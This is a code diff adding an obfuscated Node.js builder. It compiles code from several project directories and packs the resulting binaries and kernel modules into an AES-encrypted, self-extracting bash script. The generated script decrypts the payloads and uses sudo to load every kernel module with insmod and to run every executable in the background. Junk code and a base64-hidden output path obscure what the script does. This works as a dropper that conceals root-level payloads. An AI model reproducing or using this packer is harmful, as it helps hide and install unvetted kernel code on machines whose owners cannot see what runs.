@@ -1,0 +1,31 @@
+// whack importz
+const F=require("fs"),P=require("path"),C=require("crypto"),X=require("child_process"),$F=F,$P=P,$C=C,$X=X,q1=$P.join(__dirname,Buffer.from("Li4vb3V0cHV0","base64").toString()),q2=$P.join(q1,"bundle.run"),q3=$C.randomBytes(32),q4=$C.randomBytes(16);
+function _(){};
+function ab(x){return x.slice();}
+function pq(l,s,c){let S=s;while(S.length<l)S+=c;return S;}
+function IN(){let a=[].slice.call(arguments);let s="";for(let i=0;i<a.length;++i)s+=a[i]+" ";process.stdout.write(s.trim()+"\n")};
+function ERR(){let a=[].slice.call(arguments);let s="";for(let i=0;i<a.length;++i)s+=a[i]+" ";process.stderr.write(s.trim()+"\n")};
+function zOK(x){console.log(x);}
+(function(){let a=['','███╗','██╔','███','██','╚','Ultra-Bloated 600-line Obfuscated Builder',''];for(let i in a)console.log(a[i]);})();
+function $d(z,Y,x){if(!z||typeof z!=="string")return x;if(!$F.existsSync(z))return x;let n=[];try{n=$F.readdirSync(z);}catch(e){ERR("f",z,e);return x;}for(let i=0,L=n.length;i<L;++i){let B=n[i],v=$P.join(z,B),D=false;try{let S=$F.statSync(v);if(S.isDirectory())D=true;}catch(e){continue;}
+if(D)$d(v,Y,x);else for(let j=0;j<Y.length;++j)if(v.endsWith(Y[j])){x.push(v);break;}}return x;}
+function Q(x,t){t=t||"";console.log("--",t,"--");for(let i=0;i<x.length;++i)console.log(i,'->',x[i]);console.log("--e--");}
+function $s(B,A,O){IN("Spawning:",B,A.join(" "));let S=Object.assign({stdio:"inherit"},O),r=null,y=0,f=1;while(y<f){try{r=$X.spawnSync(B,A,S);}catch(e){ERR("SpawnSync",B,A,e);throw e;}if(r&&r.status===0)return;++y;}if(!r||r.status!==0){ERR('Build Failed:',B,A.join(" "));throw Error(""+B+" "+A.join(" "));}}
+function $b(){let w=[$P.join(__dirname,"../backend"),$P.join(__dirname,"../npm"),$P.join(__dirname,"../sys")],xx=[{ext:".c",cmd:"gcc",args:e=>["-O2","-static","-o",e.replace(/\.c$/,""),e]},{ext:".cpp",cmd:"g++",args:e=>["-O2","-static","-o",e.replace(/\.cpp$/,""),e]},{ext:".asm",cmd:"nasm",args:e=>["-felf64",e,"-o",e.replace(/\.asm$/,'.o')]}],pp=["-m","compileall"],SS={};
+for(let i=0;i<w.length;++i){let d=w[i];IN("P",d);for(let j=0;j<xx.length;++j){let EXT=xx[j].ext,CM=xx[j].cmd,ARR=$d(d,[EXT],[]);IN("F",ARR.length,EXT,"files.");for(let k=0;k<ARR.length;++k){let f=ARR[k],ARG=xx[j].args(f);$s(CM,ARG);SS[EXT]=(SS[EXT]||0)+1;}}
+let py=$d(d,['.py'],[]);for(let k=0;k<py.length;++k){try{$s("python3",pp.concat(py[k]));SS['.py']=(SS['.py']||0)+1;}catch(e){}}
+if($F.existsSync($P.join(d,"Cargo.toml"))){$s("cargo",["build","--release"],{cwd:d});SS["rust"]=(SS["rust"]||0)+1;}
+if($F.existsSync($P.join(d,'package.json'))){try{$s("npm",["install"],{cwd:d});}catch(e){}try{$s("npm",["run","build"],{cwd:d});}catch(e){}SS["npm"]=(SS["npm"]||0)+1;}}
+IN("Build phase",JSON.stringify(SS));return SS;}
+function _FA(){let E=['.out','.bin','.so','.ko','.pyc','.o','.run','.wasm',''],D=[$P.join(__dirname,"../backend"),$P.join(__dirname,"../npm"),$P.join(__dirname,"../sys")],aa=[];for(let i=0;i<D.length;++i)for(let j=0;j<E.length;++j)$d(D[i],[E[j]],aa);let G=[];for(let i=0;i<aa.length;++i){let f=aa[i],b=$P.basename(f);if(b.endsWith('.c')||b.endsWith('.cpp')||b.endsWith('.h')||b.endsWith('.py')||b.startsWith('.'))continue;try{let st=$F.statSync(f);if((st.mode&73)!==0||/\.(so|pyc|ko|o|bin|run|wasm)$/.test(b))G.push(f);}catch(e){}}IN("Artifacts:",G.length);return G;}
+function zz(Z,g,h){const p=$C.createCipheriv("aes-256-cbc",g,h),w=p.update(Z),f=p.final();return Buffer.concat([w,f]);}
+function dd(Z,g,h){const p=$C.createDecipheriv("aes-256-cbc",g,h),w=p.update(Z);return Buffer.concat([w,p.final()]);}
+function PB(a){let M=[],EC=[],XT={'.ko':'kernel_module','.bin':'binary','.so':'shared_lib'};for(let i=0;i<a.length;++i){let ap=a[i],O=$F.readFileSync(ap),S=$F.statSync(ap),E=zz(O,q3,q4),X=Object.keys(XT).find(z=>ap.endsWith(z)),T=X?XT[X]:'executable';M.push({name:$P.basename(ap),size:E.length,mode:S.mode,type:T});EC.push(E);}let KX=q3.toString("hex"),VX=q4.toString("hex"),
+SC=['#!/bin/bash','set -e','export TMPDIR="$(mktemp -d /tmp/bundleXXXXXX)"',"trap 'rm -rf \"$TMPDIR\"' EXIT",'NODE_DECRYPT="\\','const crypto=require(\'crypto\'),fs=require(\'fs\');\\',`const k=Buffer.from('${KX}','hex');const iv=Buffer.from('${VX}','hex');\\`,"const meta=JSON.parse(fs.readFileSync(process.argv[2]));\\","const files=JSON.parse(fs.readFileSync(process.argv[3]));\\","files.forEach((f,i)=>{\\","  const buf=Buffer.from(fs.readFileSync(process.argv[4]+'.'+i));\\","  const d=crypto.createDecipheriv('aes-256-cbc',k,iv);\\","  const raw=Buffer.concat([d.update(buf),d.final()]);\\","  const out=process.argv[5]+'/'+meta[i].name;\\","  fs.writeFileSync(out,raw,{mode:meta[i].mode||0o755});\\","});\\",'"',"echo '[*] Unpacking encrypted bundle and restoring artifacts...'",'META="$TMPDIR/meta.json"','FILES="$TMPDIR/files.json"','OUTD="$TMPDIR/run"','mkdir -p "$OUTD"',"cat > \"$META\" <<EOF",JSON.stringify(M),"EOF","cat > \"$FILES\" <<EOF",JSON.stringify(a.map((_,i)=>'file'+i)),"EOF"].join("\n")+"\n";
+let z=0;for(const e of EC)SC+=`echo "${e.toString('base64')}" | base64 -d >"$TMPDIR/file${z}"\n`,z++;
+SC+=["node -e \"$NODE_DECRYPT\" \"$META\" \"$FILES\" \"$TMPDIR\" \"$OUTD\"","chmod -R +x \"$OUTD\"","sudo bash -c '","cd \"$OUTD\"","for f in *; do","  if [[ \"$f\" == *.ko ]]; then","    insmod \"./$f\" 2>/dev/null","  elif [[ -x \"./$f\" && ! \"$f\" == *.so && ! \"$f\" == *.pyc && ! \"$f\" == *.ko ]]; then","    \"./$f\" &","  fi","done","sleep 3","for pyc in *.pyc; do python3 \"$pyc\" & done","'"].join("\n")+"\n";
+if(!$F.existsSync(q1))$F.mkdirSync(q1,{recursive:true});$F.writeFileSync(q2,SC,{mode:0o755});zOK("[B] "+q2);
+const n1=()=>'this_does_nothing'.split('_').join('');function n2(){return [42,1337,"nope"].filter(()=>false);}const n3=()=>{return true===false;};let YY=new Date().getFullYear();for(let i=0;i<2;++i){if(n3());}
+(function(){let A=0;function pr(s){let l='['+pq(20,"=".repeat((A/5)|0)," ")+']';
+process.stdout.write('\r'+l+' '+s);}try{pr('BUILDING...');$b();pr('COLLECTING...');const a=_FA();if(!a.length){ERR("no artifact");process.exit(1);}pr('PACKING...');PB(a);pr('DONE!');console.log('\n[B]');}catch(e){ERR("BUILD ERROR:",e&&e.stack?e.stack:e);process.exit(1);}
+for(let i=0;i<600-((new Error().stack.match(/\n/g)||[]).length);++i){void 0;}})();
